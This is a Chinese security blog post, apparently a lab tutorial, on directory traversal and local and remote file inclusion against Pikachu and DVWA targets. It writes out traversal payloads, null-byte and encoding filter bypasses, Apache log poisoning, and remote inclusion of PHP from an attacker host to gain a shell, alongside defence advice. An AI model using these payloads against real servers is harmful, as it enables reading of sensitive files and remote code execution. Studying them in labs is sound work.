@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/blog.github.io/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/blog.github.io/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/blog.github.io/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog.github.io/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog.github.io/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog.github.io/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/blog.github.io/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="目录遍历漏洞概述 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="目录遍历">
+<meta property="og:url" content="https://github.com/magic-2020/blog.github.io/2021/02/20/%E5%AE%89%E5%85%A8-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/index.html">
+<meta property="og:site_name" content="Magic">
+<meta property="og:description" content="目录遍历漏洞概述 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来">
+<meta property="og:locale">
+<meta property="og:image" content="https://github.com/blog.github.io/images/image-20200902215534791.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122122837602-2091062644.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122124418190-866071858.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122125924263-1282240920.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122130527658-1607236601.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122130838887-1451696930.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122133015851-1125383547.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122133210352-467797778.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122134458649-191668887.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122141734563-3569581.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122143815332-62297210.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122144007682-1299164782.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122144141057-1872866535.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122150243793-1463425658.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122150430950-1173938752.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/1312707-20181122150717616-874695890.png">
+<meta property="article:published_time" content="2021-02-20T13:11:55.000Z">
+<meta property="article:modified_time" content="2022-08-04T02:51:31.441Z">
+<meta property="article:author" content="magic">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/blog.github.io/images/image-20200902215534791.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/magic-2020/blog.github.io/2021/02/20/安全-目录遍历/"/>
+
+
+
+
+
+  <title>目录遍历 | Magic</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/blog.github.io/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Magic</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">try everyday</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog.github.io/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/blog.github.io/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/blog.github.io/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog.github.io/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/blog.github.io/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/magic-2020/blog.github.io/blog.github.io/2021/02/20/%E5%AE%89%E5%85%A8-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/blog.github.io/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Magic">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">目录遍历</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-20T21:11:55+08:00">
+                2021-02-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog.github.io/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="目录遍历漏洞概述"><a href="#目录遍历漏洞概述" class="headerlink" title="目录遍历漏洞概述"></a>目录遍历漏洞概述</h1><p> 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。   </p>
+<span id="more"></span>                   
+
+<p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。                    </p>
+<p>需要区分一下的是,如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。 </p>
+<h2 id="pikaqiu靶机实践"><a href="#pikaqiu靶机实践" class="headerlink" title="pikaqiu靶机实践"></a>pikaqiu靶机实践</h2><p><img src="/blog.github.io/images/image-20200902215534791.png" alt="image-20200902215534791"></p>
+<h3 id="1-加密参数传递的数据；"><a href="#1-加密参数传递的数据；" class="headerlink" title="(1) 加密参数传递的数据；"></a>(1) 加密参数传递的数据；</h3><p>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。</p>
+<h3 id="2-编码绕过，"><a href="#2-编码绕过，" class="headerlink" title="(2) 编码绕过，"></a>(2) 编码绕过，</h3><p>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。</p>
+<h3 id="3-目录限定绕过；"><a href="#3-目录限定绕过；" class="headerlink" title="(3) 目录限定绕过；"></a>(3) 目录限定绕过；</h3><p>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“<del>“来绕过。形如这样的提交“downfile.jsp?filename=</del>/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。</p>
+<h3 id="4-绕过文件后缀过滤；"><a href="#4-绕过文件后缀过滤；" class="headerlink" title="(4) 绕过文件后缀过滤；"></a>(4) 绕过文件后缀过滤；</h3><p>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p>
+<h3 id="5-绕过来路验证。"><a href="#5-绕过来路验证。" class="headerlink" title="(5) 绕过来路验证。"></a>(5) 绕过来路验证。</h3><p>Http Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p>
+<p>在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。</p>
+<h2 id="防范遍历路径漏洞"><a href="#防范遍历路径漏洞" class="headerlink" title="防范遍历路径漏洞"></a>防范遍历路径漏洞</h2><p>在防范遍历路径漏洞的方法中，最有效的是权限的控制，谨慎的处理向文件系统API传递过来的参数路径。主要是因为大多数的目录或者文件权限均没有得到合理的配置，而Web应用程序对文件的读取大多依赖于系统本身的API，在参数传递的过程，如果没有得严谨的控制，则会出现越权现象的出现。在这种情况下，Web应用程序可以采取以下防御方法，最好是组合使用。<br>(1) 数据净化对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。<br>(2) Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>路径遍历漏洞允许恶意攻击者突破Web应用程序的安全控制，直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限，并且这样的漏洞在发掘上也是很容易的，只要对Web应用程序的读写功能块直接手工检测，通过返回的页面内容来判断，是很直观的，利用起来也相对简单。</p>
+<h2 id="还有一种目录遍历-那就是因为这个web服务器的配置不当造成的"><a href="#还有一种目录遍历-那就是因为这个web服务器的配置不当造成的" class="headerlink" title="还有一种目录遍历 那就是因为这个web服务器的配置不当造成的"></a>还有一种目录遍历 那就是因为这个web服务器的配置不当造成的</h2><p>index of /</p>
+<p>我们可以直接利用百度语法来寻找此形式的目录遍历漏洞</p>
+<p>intitle:index of</p>
+<h2 id="目录遍历漏洞："><a href="#目录遍历漏洞：" class="headerlink" title="目录遍历漏洞："></a><strong>目录遍历漏洞：</strong></h2><p><strong>应用程序如果有操作文件的功能，限制不严格会导致可以访问到WEB目录意外的文件</strong></p>
+<p>目录遍历漏洞和文件包含漏洞本质以及利用方法一样</p>
+<p>一定要论区别的话：</p>
+<p><strong>目录遍历：对本操作系统的文件进行读取</strong></p>
+<p><strong>文件包含：1:LFI本地文件包含，和目录遍历一致；2:RFI远程文件包含</strong></p>
+<p>漏洞原因：目录权限限制不严格</p>
+<h3 id="漏洞利用示例："><a href="#漏洞利用示例：" class="headerlink" title="漏洞利用示例："></a>漏洞利用示例：</h3><p>启动Metasploitable靶机：192.168.163.129</p>
+<p>启动Kali机器：192.168.163.132</p>
+<p>在DVWA的这个目录存在文件包含漏洞：本地文件包含</p>
+<p><img src="/blog.github.io/images/1312707-20181122122837602-2091062644.png" alt="img"></p>
+<p>我们可以在Metasploitable中修改配置文件以开启远程文件包含漏洞：</p>
+<p>sudo vi /etc/php5/cgi/php.ini</p>
+<p>然后输入/allow_url进行搜索：找到这里，修改成On</p>
+<p><img src="/blog.github.io/images/1312707-20181122124418190-866071858.png" alt="img"></p>
+<p>然后重启Apache服务：</p>
+<p>sudo /etc/init.d/apache2 restart</p>
+<p>这时候Metasploitable就会存在远程文件包含漏洞了</p>
+<h3 id="目录遍历漏洞的特征要注意："><a href="#目录遍历漏洞的特征要注意：" class="headerlink" title="目录遍历漏洞的特征要注意："></a>目录遍历漏洞的特征要注意：</h3><p>?page=xxx.php</p>
+<p>?home=xxx.html</p>
+<p>?index=xxx.jsp</p>
+<p>?file=content</p>
+<h3 id="常用漏洞验证方式："><a href="#常用漏洞验证方式：" class="headerlink" title="常用漏洞验证方式："></a>常用漏洞验证方式：</h3><h4 id="1：-（多少个-都行，越多越好）-etc-passwd"><a href="#1：-（多少个-都行，越多越好）-etc-passwd" class="headerlink" title="1：../../../../../../（多少个../都行，越多越好）/etc/passwd"></a>1：../../../../../../（多少个../都行，越多越好）/etc/passwd</h4><p><img src="/blog.github.io/images/1312707-20181122125924263-1282240920.png" alt="img"></p>
+<p>URL上这一串东西的意义：../返回上级目录，当返回到根目录时候再../还是根目录，然后直接进入linux系统的passwd文件</p>
+<h4 id="2-file-etc-passwd（这里是文件包含漏洞，不过利用方法一致）"><a href="#2-file-etc-passwd（这里是文件包含漏洞，不过利用方法一致）" class="headerlink" title="2.file:///etc/passwd（这里是文件包含漏洞，不过利用方法一致）"></a>2.file:///etc/passwd（这里是文件包含漏洞，不过利用方法一致）</h4><p><img src="/blog.github.io/images/1312707-20181122130527658-1607236601.png" alt="img"></p>
+<h4 id="3-http-xxxxx"><a href="#3-http-xxxxx" class="headerlink" title="3.http://xxxxx"></a>3.<a target="_blank" rel="noopener" href="http://xxxxx/">http://xxxxx</a></h4><p><img src="/blog.github.io/images/1312707-20181122130838887-1451696930.png" alt="img"></p>
+<p>前两者用途：可以读取到目标系统的机密文件</p>
+<p>远程文件包含用途：可以构建一个带有shellcode的网站，使目标访问，进而得到shell（虽然是低权限shell）</p>
+<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a><strong>注意事项：</strong></h3><p>1.有时候?page=../../../etc/passwd，显示找不到passwd.php文件，这是目标系统开启了过滤机制</p>
+<p>绕过办法：PHP5.3版本以前的，可以用一个空字符%00来解决，示例：</p>
+<p>?page=../../../etc/passwd%00</p>
+<p>这时候就算目标机器补上一个.php，也无所谓</p>
+<p>2.有的服务器会过滤非法字符，比如/$&amp;.*等，我们可以采用一些编码来处理</p>
+<p>路径方面，linux一定是/，windows通常是\，但有可能是/，实际中可以多次发送根据结果来得到答案</p>
+<p>编码方面：示例</p>
+<p>URL编码：</p>
+<p>../   %2e%2e%2f</p>
+<p>..\   %2e%2e%5c</p>
+<p>..\   %252e%252e%255c (双层URL编码)</p>
+<p>Unicode/UTF-8编码：</p>
+<p>../   ..%c0%af   ..%u2216  </p>
+<p>..\   ..%c1%9c</p>
+<p>编码工具：之前介绍的很多工具都有，我用Burp来举例</p>
+<p><img src="/blog.github.io/images/1312707-20181122133015851-1125383547.png" alt="img"></p>
+<p>可以用URL编码后的字符做尝试：成功</p>
+<p><img src="/blog.github.io/images/1312707-20181122133210352-467797778.png" alt="img"></p>
+<p><img src="/blog.github.io/images/1312707-20181122134458649-191668887.png" alt="img"></p>
+<p>上边说到本地文件包含来查看文件内容</p>
+<p><strong>通常认为本地文件包含漏洞无法执行代码</strong></p>
+<p>万事没有绝对，有极其特殊的方式可以执行代码</p>
+<p><strong>比如：利用访问日志</strong></p>
+<p>当我们访问一个WebServer例如Apache时候，就会有访问日志</p>
+<p>会记录下来访问IP和访问的URL等一些简单的信息</p>
+<p>我们用nc连接到目标的80端口：发送一段这样的东西</p>
+<p> <img src="/blog.github.io/images/1312707-20181122141734563-3569581.png" alt="img"></p>
+<p>然后会在apache的日志中插入一段php代码：然后对日志文件chmod，改为可执行权限</p>
+<p>如果失败了的话，多层chmod，使访问目录的所有层都赋予权限，然后利用文件包含，有机会执行代码（不一定成功）</p>
+<h3 id="远程文件包含示例："><a href="#远程文件包含示例：" class="headerlink" title="远程文件包含示例："></a><strong>远程文件包含示例：</strong></h3><p>我先用NC侦听本地80端口：</p>
+<p><img src="/blog.github.io/images/1312707-20181122143815332-62297210.png" alt="img"></p>
+<p>远程文件包含到Kali机器：这是输入Kali的IP，至于URL随便写</p>
+<p><img src="/blog.github.io/images/1312707-20181122144007682-1299164782.png" alt="img"></p>
+<p>然后一直显示连接状态</p>
+<p>查看NC，发现收到了连接请求：</p>
+<p><img src="/blog.github.io/images/1312707-20181122144141057-1872866535.png" alt="img"></p>
+<p>nc只是获得了连接请求，实际没用</p>
+<p>下面展示实际使用方式</p>
+<p>利用Kali本机的Apache服务</p>
+<p>到/var/www/html目录下，新建文本 1.txt，写入上边的php代码（或者搞个木马脚本都行，这里为了方便）</p>
+<p><img src="/blog.github.io/images/1312707-20181122150243793-1463425658.png" alt="img"></p>
+<p>保存之后开启Apache服务</p>
+<p><img src="/blog.github.io/images/1312707-20181122150430950-1173938752.png" alt="img"></p>
+<p>然后测试：</p>
+<p><img src="/blog.github.io/images/1312707-20181122150717616-874695890.png" alt="img"> </p>
+<p>成功执行了ls命令</p>
+<p>到这一步就相当于拿到了shell</p>
+<p>最后：</p>
+<p>我们可以查看DVWA这里的远程文件包含的源码：</p>
+<p>LOW级别：直接获取文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">    $file = $_GET[&#x27;page&#x27;]; //The page we wish to display </span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>MEDIUM级别：过滤特殊字符，导致无法远程文件包含</p>
+<p>解决方法：编码</p>
+<p>比如<a href="http://192.168.163.132======&gt;%68%74%74%70%3a%2f%2f192.168.163.132">http://192.168.163.132======&gt;%68%74%74%70%3a%2f%2f192.168.163.132</a></p>
+<p>如果失败，就可以只针对http://中的某个字符，比如/进行编码</p>
+<p>如果还是失败，可以进行一种巧妙的方法</p>
+<p><strong>非常经典的关键字绕过方法：</strong></p>
+<p><strong>ht<a target="_blank" rel="noopener" href="http://tp//192.168.163.132">http://tp://192.168.163.132</a></strong></p>
+<p>我在一个http://中插入了一个http://，<strong>服务器只会识别一次</strong>，如果两个分开写都会被过滤，<strong>穿插来写</strong>，只会过滤一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">    $file = $_GET[&#x27;page&#x27;]; // The page we wish to display </span><br><span class="line"></span><br><span class="line">    // Bad input validation</span><br><span class="line">    $file = str_replace(&quot;http://&quot;, &quot;&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;, &quot;&quot;, $file);        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>HIGH级别：规定写死，只能包含include.php</p>
+<p>这种方式基本无解了，没有漏洞，或者我水平低下找不到漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">        </span><br><span class="line">    $file = $_GET[&#x27;page&#x27;]; //The page we wish to display </span><br><span class="line"></span><br><span class="line">    // Only allow include.php</span><br><span class="line">    if ( $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">        echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>总结：</p>
+<p>远程文件包含漏洞出现概率远远小于本地文件包含漏洞</p>
+<p>但是远程文件包含漏洞更容易被利用</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog.github.io/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog.github.io/2021/02/15/%E7%B3%BB%E7%BB%9F-Kali%E5%AE%89%E8%A3%85docker/" rel="next" title="Kali安装docker">
+                <i class="fa fa-chevron-left"></i> Kali安装docker
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog.github.io/2021/02/20/%E5%AE%89%E5%85%A8-%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E6%9C%BA/" rel="prev" title="皮卡丘靶机练习">
+                皮卡丘靶机练习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/blog.github.io/images/avatar.gif"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <!-- <a href="/blog.github.io/archives/%7C%7C%20archive"> -->
+				<a href="/blog.github.io/archives">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/blog.github.io/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/blog.github.io/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">目录遍历漏洞概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pikaqiu%E9%9D%B6%E6%9C%BA%E5%AE%9E%E8%B7%B5"><span class="nav-number">1.1.</span> <span class="nav-text">pikaqiu靶机实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8A%A0%E5%AF%86%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%9B"><span class="nav-number">1.1.1.</span> <span class="nav-text">(1) 加密参数传递的数据；</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%8C"><span class="nav-number">1.1.2.</span> <span class="nav-text">(2) 编码绕过，</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%9B%AE%E5%BD%95%E9%99%90%E5%AE%9A%E7%BB%95%E8%BF%87%EF%BC%9B"><span class="nav-number">1.1.3.</span> <span class="nav-text">(3) 目录限定绕过；</span></a></li><li class="nav-item nav-level-3"><a 